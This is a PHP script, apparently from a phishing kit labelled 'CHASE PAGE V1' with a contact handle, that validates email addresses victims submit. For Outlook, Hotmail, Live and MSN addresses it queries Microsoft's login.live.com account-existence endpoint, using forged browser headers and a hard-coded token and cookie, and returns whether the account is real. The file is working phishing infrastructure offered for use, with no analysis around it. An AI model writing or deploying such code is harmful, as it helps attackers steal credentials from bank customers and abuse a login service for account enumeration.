<?php
include'admin/config.php'; 
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
if ($valid_email_true = "on") {

$email = $_POST['email'];
function checkemail($str) {
         return (!preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $str)) ? FALSE : TRUE;
   }
if (checkemail($email)) {
if(strpos($email, 'live') or strpos($email, 'hotmail') or strpos($email, 'msn') or strpos($email, 'outlook')){
									$ch = curl_init();
									curl_setopt($ch, CURLOPT_URL, 'https://login.live.com/GetCredentialType.srf');
									curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
									curl_setopt($ch, CURLOPT_POST, 1);
									curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"'.$email.'","uaid":"","isOtherIdpSupported":true,"checkPhones":true,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"forceotclogin":false,"otclogindisallowed":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":3,"isSignup":false,"flowToken":"DRJ2f5KelKmW78bwUT4R0yHqJ1uCO0VAKoJs0HuqO9Iv75CMbTwRx68nDm0rlA60EyuWHWufls3pBOGkpMLqH5NHp1icGzbubeixt2ejtOzM7Rv53XKUYJy4s\u0021OUPFd85m\u00217*hgJQ8tNfu0T0Z3VO0uN*qj*GRh6oTBUZfzBCrGn0IOnxz4UWKLvxdPkvjTyfmVhLnPl0JF0O7axaz4oOPE$"}');
									curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
									$headers = array();
									$headers[] = 'Connection: keep-alive';
									$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"';
									$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
									$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
									$headers[] = 'Content-Type: application/json; charset=UTF-8';
									$headers[] = 'Hpgid: 33';
									$headers[] = 'Accept: application/json';
									$headers[] = 'Hpgact: 0';
									$headers[] = 'Origin: https://login.live.com';
									$headers[] = 'Sec-Fetch-Site: same-origin';
									$headers[] = 'Sec-Fetch-Mode: cors';
									$headers[] = 'Sec-Fetch-Dest: empty';
									$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7,fr;q=0.6';
									$headers[] = 'Cookie: MSPOK=$uuid-cfb090ad-f715-40e7-98ac-b7fc2d990992$uuid-6dec6ade-77be-4148-b773-66464b0a4867$uuid-7261f2e8-e4d9-4a39-8d8f-464485504a17$uuid-fd29339f-3c55-4cf1-b360-041d3116502b$uuid-8819303d-05d1-4fce-ba9f-5bbde0a2dec9';
									curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

									$result = curl_exec($ch);
									if (curl_errno($ch)) {
									    echo 'Error:' . curl_error($ch);
									}
									curl_close($ch);
									$json = json_decode($result, true);
									$check = $json['IfExistsResult'];
									if ($check == 0) {
										echo "good";exit();
									}elseif ($check == 1) {
										echo "invalid";exit();
									}else{
										echo "good";exit();
									}
					         }else{
					         	echo "good";exit();
					         }

}else{
	echo "bad";exit();
}

}else{
	echo "good";exit();
}